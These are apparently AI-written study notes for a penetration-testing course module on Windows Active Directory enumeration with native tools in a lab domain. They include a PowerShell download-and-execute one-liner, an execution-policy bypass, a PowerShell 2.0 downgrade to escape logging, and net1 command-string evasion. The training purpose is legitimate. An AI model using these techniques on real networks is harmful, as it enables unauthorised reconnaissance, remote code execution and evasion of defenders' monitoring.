## 1. What is “Living Off the Land”?

The module begins by explaining that earlier AD enumeration techniques often required us to:

- Upload tools to the foothold host, or
    
- Have an attack host inside the target environment.
    

**Living Off the Land (LotL)** takes a different approach:

> Use tools and commands that are **already present on the Windows/Active Directory host**.

This is particularly useful when external tools cannot be introduced into the environment.

### Basic idea

```text
Normal approach
────────────────────────
Compromised Host
      │
      ├── Download tools
      ├── Transfer tools
      └── Execute tools


Living Off the Land
────────────────────────
Compromised Host
      │
      ├── PowerShell
      ├── WMIC
      ├── net
      ├── dsquery
      ├── WMI
      └── Native Windows utilities
```

![Image](https://images.openai.com/static-rsc-4/cskNdj6b609YNxSZP7DMQpXS1irNG0PW_TVsrh38Hb-RB6wO_HCz1jzBjFUnHDc3YoCC8Hh2-XP1-Q_QRJSspugNYpgwfXISnANxAqWCh0MGtKl7X5HIf_p-GEFuAfhpoNQOul07a2KU2TAFGiTHsNEOrMIBi5poU_KryUsGoY2E3nhSOWBUuZ5UFwnSqWkh?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/WADPXCYsf3kpJaOTpM3ZUZy6WP3QYcvnL37QSDFKLuaaEpYjIaRt9GYyJpgPKG4Chd2WWDVL1XwQgSrh_NWqEBuzQC1XHBtxUN9kbv9Gz86yO4T3TaJj2bNH39pWhiykqUnEanFBFUjQJL1y3KqYMXtnEIZh8zZTfGdCZpz6iatLMViLRbW47Dwvo9k97kwN?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/SFrBWhpPvirHbsmm0lUXXlL2neDF-xvIW-MejR9-6jVLCcGNfR53HzP2i0wg5wZy0PN5LT3T5KtxGbwIaj_I-ywfw3Z8onann4p9oVyBq25lV_u3UOhejR2Z1fjr9Ige7DH-Zf_cgiiFJnHjcfL44SRvIA15oNqVXDfcBjTW7zVc0l_nYNY5HbfLCsXxjuFm?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/n3I6ko_x9otIH3SwWRmI6zOkGAu7IE5yl3l2scqxbrf18NlmK4sfIcNCVvU3HQc7LjeZdUmfxPYqFzdxnXzMFI4dlevOaxMl5ZkvAHUS3kw8AidZPzgpX-zPhgnl1WzPy0UhD_Wc_jWCat-07ta_TJV26i5lZMx4DAvfZzfh2ZP5ZKapWiMBdseDr3cqH4nn?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/HTXfAqdPXNtSz3bP9J-HtJwqweXlT7T1WdbPZrMqE7sbquA4w6f0YJzqUHi_2i7Da2_Z2dudwGzuuIGhlKHD8CgAO1UEgfDtASRALkfDcuIvPzctifORfS295Y4nlNZ1qEW19IRLzkgimdRzrpcpPdNSJl-Awz_i_LcTzmmIM4z_PVdvTA80kjt5mNVVwMOt?purpose=fullsize)

---

# 2. Why Living Off the Land?

The module gives an important assessment scenario:

> The client gives us access to a managed host that has **no Internet access**, and attempts to load tools onto it have failed.

Therefore, we need to use native Windows functionality.

### Security advantage

Using native tools **can be more stealthy** because pulling external tools into the environment may generate additional:

- Logs
    
- Alerts
    
- Network traffic
    
- EDR detections
    

Modern enterprise environments may have:

```text
IDS / IPS
     │
Firewalls
     │
Network monitoring
     │
Passive sensors
     │
Windows Defender
     │
Enterprise EDR
     │
Network-baseline/anomaly detection
```

The module emphasizes that introducing external tools can increase the chance of detection.

### ⚠️ Important

**Living Off the Land ≠ invisible.**

Native Windows commands can themselves be monitored and detected.

The module later specifically notes that `net.exe` commands are commonly monitored by EDR.

---

# 3. Initial Host & Network Recon

Before performing deeper enumeration, we should understand the machine we're currently on.

## Basic Enumeration Commands

|Command|What it gives us|
|---|---|
|`hostname`|PC name|
|`[System.Environment]::OSVersion.Version`|OS version and revision|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Installed patches/hotfixes|
|`ipconfig /all`|Network adapter configuration|
|`set`|Environment variables from CMD|
|`echo %USERDOMAIN%`|Domain name|
|`echo %logonserver%`|Domain Controller the host checks in with|

### Why these matter

A quick enumeration pass can answer:

```text
Who am I?
     ↓
What machine am I on?
     ↓
What OS is it?
     ↓
What patches exist?
     ↓
What network am I connected to?
     ↓
What domain am I part of?
     ↓
Which DC am I communicating with?
```

---

# 4. `systeminfo`

The module explains that the information above can be gathered in a more consolidated way with:

```cmd
systeminfo
```

It produces a summary of host information in one output.

### Operational-security consideration

The module notes that running one command instead of many commands generates fewer logs, potentially reducing visibility to defenders.

---

# 5. Harnessing PowerShell

PowerShell is extremely important in Windows environments.

The module describes PowerShell as a framework used by Windows administrators to:

- Administer Windows systems
    
- Administer AD environments
    
- Script tasks
    
- Enumerate hosts
    
- Enumerate networks
    
- Send/receive files
    

---

# 6. Important PowerShell Cmdlets

The module provides several important commands.

### `Get-Module`

```powershell
Get-Module
```

Lists available modules loaded for use.

---

### `Get-ExecutionPolicy -List`

```powershell
Get-ExecutionPolicy -List
```

Displays execution-policy settings for each scope.

---

### `Set-ExecutionPolicy`

The module shows:

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

The important part is:

```text
-Scope Process
```

This limits the change to the current process. The module notes that the policy reverts when the process terminates.

---

### Environment variables

```powershell
Get-ChildItem Env: | ft Key,Value
```

Can reveal information such as:

- Paths
    
- Users
    
- Computer information
    
- Domain information
    

---

### PowerShell history

```powershell
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

This can be particularly interesting because command history may contain:

- Passwords
    
- Configuration-file locations
    
- Scripts
    
- Other useful operational information
    

### 🧠 Mentor point

Always remember:

```text
PowerShell History
       ↓
Previous commands
       ↓
Possible credentials
       ↓
Possible configuration files
       ↓
Possible additional access
```

---

# 7. PowerShell Download & Execute

The module provides this example:

```powershell
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
```

This demonstrates using PowerShell to download a file and call it from memory.

**For your HTB lab:** understand what each component does rather than memorizing the entire command blindly.

---

# 8. Example PowerShell Enumeration

The module demonstrates:

```powershell
Get-Module
```

followed by:

```powershell
Get-ExecutionPolicy -List
```

and:

```powershell
whoami
```

Example result:

```text
nt authority\system
```

It then uses:

```powershell
Get-ChildItem Env: | ft key,value
```

The example reveals values such as:

```text
COMPUTERNAME    ACADEMY-EA-MS01
USERDOMAIN      INLANEFREIGHT
USERNAME        ACADEMY-EA-MS01$
USERPROFILE     C:\Windows\system32\config\systemprofile
```

### What should you recognize?

The important fields are:

```text
COMPUTERNAME
USERDOMAIN
USERNAME
USERPROFILE
SystemRoot
Path
PSModulePath
```

These help establish the current execution context.

---

# 9. PowerShell Version & Logging

The module discusses an important operational-security topic: **multiple PowerShell versions may exist on a host**.

It demonstrates checking the version:

```powershell
Get-host
```

Example:

```text
Version : 5.1.19041.1320
```

Then:

```powershell
powershell.exe -version 2
```

and:

```powershell
Get-host
```

shows:

```text
Version : 2.0
```

### Why does the module discuss this?

The module explains that PowerShell event logging was introduced with **PowerShell 3.0 and later** and demonstrates how older PowerShell versions affected Script Block Logging.

---

# 10. PowerShell Operational Logs

The module identifies two important logging locations:

### PowerShell Operational Log

```text
Applications and Services Logs
    └── Microsoft
        └── Windows
            └── PowerShell
                └── Operational
```

### Windows PowerShell log

```text
Applications and Services Logs
    └── Windows PowerShell
```

---

## Script Block Logging

With Script Block Logging enabled, commands entered into PowerShell can be recorded.

The module explains that PowerShell 2.0 does not support this logging in the same way as newer versions.

### ⚠️ Critical operational-security point

The downgrade itself can leave evidence.

The command:

```powershell
powershell.exe -version 2
```

is logged before the session changes.

Therefore:

```text
Attempt to reduce logging
        ↓
Downgrade command gets logged
        ↓
Defender sees unusual behavior
        ↓
Potential investigation
```

The module explicitly warns that a vigilant defender may notice the logging stops after the downgrade.

---

# 11. Checking Defenses

The module then moves into checking the host's defensive state.

Two native utilities are introduced:

```text
netsh
sc
```

These can help determine:

- Windows Firewall status
    
- Windows Defender service status
    

---

# 12. Windows Firewall

Command:

```cmd
netsh advfirewall show allprofiles
```

This displays settings for:

```text
Domain Profile
Private Profile
Public Profile
```

The output includes:

```text
State
Firewall Policy
Logging
RemoteManagement
InboundUserNotification
```

### Example from the module

```text
Domain Profile Settings:

State              OFF
Firewall Policy    BlockInbound,AllowOutbound
```

---

# 13. Windows Defender Service

From CMD:

```cmd
sc query windefend
```

Example:

```text
SERVICE_NAME: windefend
STATE        : 4  RUNNING
```

### Interpretation

```text
RUNNING
   ↓
Defender service is active
```

This is only a service-status check, not a complete Defender configuration assessment.

---

# 14. `Get-MpComputerStatus`

PowerShell provides:

```powershell
Get-MpComputerStatus
```

This provides detailed Defender information.

Important fields from the module include:

```text
AMServiceEnabled
AntispywareEnabled
AntivirusEnabled
BehaviorMonitorEnabled
DefenderSignaturesOutOfDate
IoavProtectionEnabled
IsTamperProtected
FullScanRequired
```

### Why this matters

The module points out that understanding AV settings can help us determine:

- What protections are enabled
    
- Whether signatures are current
    
- Whether scans are required
    
- What settings are active
    

It also provides useful information for reporting defensive gaps.

---

# 15. “Am I Alone?”

This is a very important operational-security concept.

When you first land on a machine, determine whether another user is currently logged in.

Why?

Because your actions could be noticed.

For example:

```text
You interact with host
       ↓
Another user is active
       ↓
Popup / logout / unexpected activity
       ↓
User notices
       ↓
Incident reported
```

The module warns that this could result in losing the foothold.

---

# 16. `qwinsta`

Command:

```cmd
qwinsta
```

Example:

```text
SESSIONNAME       USERNAME       ID  STATE
services                         0   Disc
>console           forend        1   Active
rdp-tcp                          65536 Listen
```

### What does it tell us?

It gives information about:

- Sessions
    
- Users
    
- Session IDs
    
- Session state
    
- RDP listeners
    

---

# 17. Network Information

The module introduces four important commands:

|Command|Purpose|
|---|---|
|`arp -a`|Lists known hosts in ARP cache|
|`ipconfig /all`|Network adapter information|
|`route print`|Routing table|
|`netsh advfirewall show allprofiles`|Firewall status|

---

# 18. `arp -a`

Command:

```cmd
arp -a
```

Shows hosts known to the local system through the ARP table.

The module's example contains hosts such as:

```text
172.16.5.5
172.16.5.130
172.16.5.240
```

### Why is ARP useful?

It can give us clues about:

```text
Nearby systems
     ↓
Potential servers
     ↓
Potential domain infrastructure
     ↓
Possible lateral-movement targets
```

---

# 19. `route print`

Command:

```cmd
route print
```

Displays:

- IPv4 routes
    
- IPv6 routes
    
- Network destinations
    
- Netmasks
    
- Gateways
    
- Interfaces
    
- Metrics
    

### Important pentesting concept

The module highlights that networks present in the routing table may represent potential avenues for **lateral movement** or **pivoting**.

This is particularly useful when scanning must be limited during a black-box assessment.

---

# 🧭 Network Discovery Mental Model

```text
             COMPROMISED HOST
                    │
       ┌────────────┼────────────┐
       ▼            ▼            ▼
   ipconfig       arp -a     route print
       │            │            │
       ▼            ▼            ▼
   Interfaces    Known hosts   Networks
       │            │            │
       └────────────┼────────────┘
                    ▼
             Network picture
                    │
                    ▼
              Pivot / Lateral
              Movement Ideas
```

The module explicitly recommends considering these commands during engagements.

---

# 20. Windows Management Instrumentation — WMI

**Windows Management Instrumentation (WMI)** is widely used in Windows enterprise environments for:

- Retrieving information
    
- Running administrative tasks
    
- Querying local hosts
    
- Querying remote hosts
    

---

## Important WMI Commands

|Command|Purpose|
|---|---|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Patch/hotfix information|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Basic system information|
|`wmic process list /format:list`|Processes|
|`wmic ntdomain list /format:list`|Domain/DC information|
|`wmic useraccount list /format:list`|Local/domain accounts logged into device|
|`wmic group list /format:list`|Local groups|
|`wmic sysaccount list /format:list`|System/service accounts|

---

# 21. WMI Domain Enumeration

The module demonstrates:

```powershell
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

Example output identifies:

```text
INLANEFREIGHT
LOGISTICS
FREIGHTLOGISTIC
```

and their respective Domain Controller addresses.

### 🧠 Mentor point

This is particularly valuable because WMI can reveal information about:

```text
Current domain
      +
Child domains
      +
Trusted/external forest information
      +
Domain Controllers
```

---

# 22. `net` Commands

The module introduces Windows `net.exe` commands as another native enumeration mechanism.

They can enumerate:

- Local users
    
- Domain users
    
- Groups
    
- Hosts
    
- Group membership
    
- Domain Controllers
    
- Password requirements
    

### ⚠️ Detection consideration

The module explicitly warns:

> `net.exe` commands are typically monitored by EDR solutions.

Some organizations may even alert when certain commands are run by users in unexpected OUs.

---

# 23. Important `net` Commands

### Password requirements

```cmd
net accounts
```

### Domain password/lockout policy

```cmd
net accounts /domain
```

### Domain groups

```cmd
net group /domain
```

### Domain Admins

```cmd
net group "Domain Admins" /domain
```

### Domain computers

```cmd
net group "domain computers" /domain
```

### Domain Controllers

```cmd
net group "Domain Controllers" /domain
```

### Members of a specific domain group

```cmd
net group <domain_group_name> /domain
```

### Local groups

```cmd
net localgroup
```

### Domain administrators group

```cmd
net localgroup administrators /domain
```

### Local Administrators group

```cmd
net localgroup Administrators
```

### Shares

```cmd
net share
```

### Domain user information

```cmd
net user <ACCOUNT_NAME> /domain
```

### All domain users

```cmd
net user /domain
```

### Current user

```cmd
net user %username%
```

### Mount a share

```cmd
net use x: \computer\share
```

### List computers

```cmd
net view
```

### Domain shares

```cmd
net view /all /domain[:domainname]
```

### Shares on a specific computer

```cmd
net view \computer /ALL
```

### Domain computers

```cmd
net view /domain
```

---

# 24. `net group /domain`

Example:

```cmd
net group /domain
```

The command contacts a Domain Controller and returns domain groups.

Example groups shown by the module include:

```text
Accounting
Barracuda_all_access
Billing
CEO
CFO
Contractors
CTO
...
```

---

# 25. Domain User Enumeration

Command:

```cmd
net user /domain wrouse
```

The example returns information such as:

```text
User name
Full Name
Account active
Account expires
Password last set
Password expires
Password required
User may change password
Workstations allowed
Last logon
Logon hours allowed
Local Group Memberships
Global Group memberships
```

### 🧠 Why this is useful

A single command can reveal both:

```text
Account properties
        +
Group memberships
```

This can help identify users with interesting permissions.

---

# 26. `net1`

The module discusses a variation:

```cmd
net1
```

instead of:

```cmd
net
```

The module states that `net1` performs the same functions and discusses it in the context of command-string monitoring.

### Important

This is presented by the module as an operational-security technique. Don't interpret it as guaranteed evasion; defenders can monitor behavior rather than merely matching one command string.

---

# 27. Dsquery

`dsquery` is a native command-line tool for finding **Active Directory objects**.

The module explains that similar queries could be performed with:

- BloodHound
    
- PowerView
    

but those tools may not be available.

`dsquery` is particularly useful because it is likely to exist in environments where Active Directory Domain Services tools are installed, and the module notes that:

```text
C:\Windows\System32\dsquery.dll
```

exists on modern Windows systems.

---

# 28. `dsquery user`

Command:

```cmd
dsquery user
```

Returns Distinguished Names (DNs) of users.

Example:

```text
CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

It can also return users located inside specific OUs.

### Understand the DN

Example:

```text
CN=Annie Vazquez,
OU=Finance,
OU=Financial-LON,
OU=Employees,
OU=Corp,
DC=INLANEFREIGHT,
DC=LOCAL
```

This tells us the object's location within the AD hierarchy.

---

# 29. `dsquery computer`

Command:

```cmd
dsquery computer
```

Returns computer objects.

The module's examples include:

```text
ACADEMY-EA-DC01
ACADEMY-EA-MS01
ACADEMY-EA-MX01
SQL01
ILF-XRG
MAINLON
CISERVER
INDEX-DEV-LON
SQL-0253
NYC-0615
...
```

### Why useful?

This can help build a basic map:

```text
Domain
 ├── Domain Controllers
 ├── Web Servers
 ├── Mail Servers
 ├── SQL Servers
 ├── Critical Servers
 └── Other computers
```

---

# 30. `dsquery *` — Wildcard Search

The module demonstrates:

```cmd
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

This can enumerate objects within the specified container.

Example objects include:

```text
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Protected Users
Key Admins
Enterprise Key Admins
DnsAdmins
certsvc
svc_vmwaresso
```

---

# 31. LDAP Filtering with `dsquery`

One of the most important parts of the module is LDAP filtering.

The module demonstrates searching for users with the:

```text
PASSWD_NOTREQD
```

flag.

Command:

```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

Example results include:

```text
Guest
Marion Lowe
Yolanda Groce
Eileen Hamilton
Jessica Ramsey
NAGIOSAGENT
LOGISTICS$
FREIGHTLOGISTIC$
```

---

# 32. Searching for Domain Controllers

The module demonstrates another LDAP filter:

```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

The result:

```text
ACADEMY-EA-DC01$
```

### Important number

```text
8192
```

represents the relevant UAC bit used in this query for Domain Controllers.

---

# 33. LDAP Filtering Explained

This is a **very important concept**.

The module explains a filter such as:

```text
userAccountControl:1.2.840.113556.1.4.803:=8192
```

as three conceptual components:

```text
userAccountControl
        │
        ▼
Attribute being examined

1.2.840.113556.1.4.803
        │
        ▼
LDAP matching rule / OID

8192
        │
        ▼
Bitmask being matched
```

---

# 34. User Account Control — UAC

`userAccountControl` contains flags representing different account settings.

The module explains that values can be combined because multiple bits may be set simultaneously.

So conceptually:

```text
UAC integer
   │
   ├── Bit 1
   ├── Bit 2
   ├── Bit 3
   ├── ...
   └── Multiple flags
```

---

# 35. LDAP Matching OIDs

The module presents three important OIDs.

## 1. `1.2.840.113556.1.4.803`

Used when the bit value must match completely.

The module describes this as useful for matching a singular attribute.

---

## 2. `1.2.840.113556.1.4.804`

Used when **any bit** in the chain can match.

This is useful when an object has multiple attributes/bits set.

---

## 3. `1.2.840.113556.1.4.1941`

Used for filters involving the **Distinguished Name** and searches through ownership/membership relationships.

### Memorize these three

```text
803 → Match rule
804 → Any-bit matching
1941 → DN / membership traversal
```

This is one of the key exam/viva points from the module.

---

# 36. LDAP Logical Operators

The module introduces:

```text
&
|
!
```

### `&` — AND

All conditions must match.

Example:

```text
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
```

This searches for:

```text
objectClass = user
        AND
UAC bit = 64
```

---

### `!` — NOT

Example:

```text
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
```

This searches for user objects that **do NOT** have the specified attribute.

---

### `|` — OR

Used to match alternative conditions.

Conceptually:

```text
(condition A)
       OR
(condition B)
```

The module introduces these as the basic logical operators for constructing LDAP searches.

---

# 🧠 Complete Living-Off-the-Land Workflow

Here's the mental model I want you to remember from this module:

```text
             INITIAL FOOTHOLD
                    │
                    ▼
        ┌─────────────────────┐
        │ Identify the host   │
        └──────────┬──────────┘
                   │
          hostname / systeminfo
                   │
                   ▼
        ┌─────────────────────┐
        │ Identify user       │
        │ & domain context    │
        └──────────┬──────────┘
                   │
              whoami / env
                   │
                   ▼
        ┌─────────────────────┐
        │ Check other users   │
        └──────────┬──────────┘
                   │
                 qwinsta
                   │
                   ▼
        ┌─────────────────────┐
        │ Network discovery   │
        └──────────┬──────────┘
                   │
       ipconfig / arp / route
                   │
                   ▼
        ┌─────────────────────┐
        │ Check defenses      │
        └──────────┬──────────┘
                   │
      netsh / sc / Defender
                   │
                   ▼
        ┌─────────────────────┐
        │ AD enumeration      │
        └──────────┬──────────┘
                   │
          WMI / net / dsquery
                   │
                   ▼
        ┌─────────────────────┐
        │ LDAP filtering      │
        └──────────┬──────────┘
                   │
          UAC / OID / filters
                   │
                   ▼
           DEEPER AD ENUM
```

---

# 🧾 High-Value Command Cheat Sheet

### Host

```cmd
hostname
systeminfo
whoami
```

### OS / patches

```powershell
[System.Environment]::OSVersion.Version
```

```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Network

```cmd
ipconfig /all
arp -a
route print
```

### Sessions

```cmd
qwinsta
```

### Firewall

```cmd
netsh advfirewall show allprofiles
```

### Defender

```cmd
sc query windefend
```

```powershell
Get-MpComputerStatus
```

### PowerShell

```powershell
Get-Module
Get-ExecutionPolicy -List
Get-ChildItem Env: | ft Key,Value
```

### Domain

```cmd
net accounts /domain
net user /domain
net group /domain
net view /domain
```

### User information

```cmd
net user <ACCOUNT_NAME> /domain
```

### Group information

```cmd
net group "Domain Admins" /domain
```

### WMI

```cmd
wmic ntdomain list /format:list
wmic process list /format:list
wmic useraccount list /format:list
wmic group list /format:list
```

### Dsquery

```cmd
dsquery user
dsquery computer
```

```cmd
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

### LDAP

```text
userAccountControl:1.2.840.113556.1.4.803
userAccountControl:1.2.840.113556.1.4.804
userAccountControl:1.2.840.113556.1.4.1941
```

---

# 🎯 What You Should Be Able to Explain After This Module

Before starting the exercises, make sure you understand these:

1. **What Living off the Land means**
    
2. Why native tools can be useful when external tools cannot be transferred
    
3. What `systeminfo` provides
    
4. How PowerShell can be used for enumeration
    
5. Why PowerShell history can be interesting
    
6. What `qwinsta` tells us
    
7. Difference between `arp -a` and `route print`
    
8. What WMI is used for
    
9. What information `net` commands can enumerate
    
10. What `dsquery` does
    
11. What a Distinguished Name (DN) looks like
    
12. What `userAccountControl` represents
    
13. What the three important LDAP OIDs mean
    
14. How `&`, `|`, and `!` work in LDAP filters
    
15. Why native commands **can still be detected**
    

The module closes by transitioning from these enumeration techniques toward **Kerberoasting**, which is the next major AD technique in the course.

**Notes are complete.** We can now move to the **Living Off the Land exercises**, one question at a time, and I’ll guide you without immediately giving you the answer.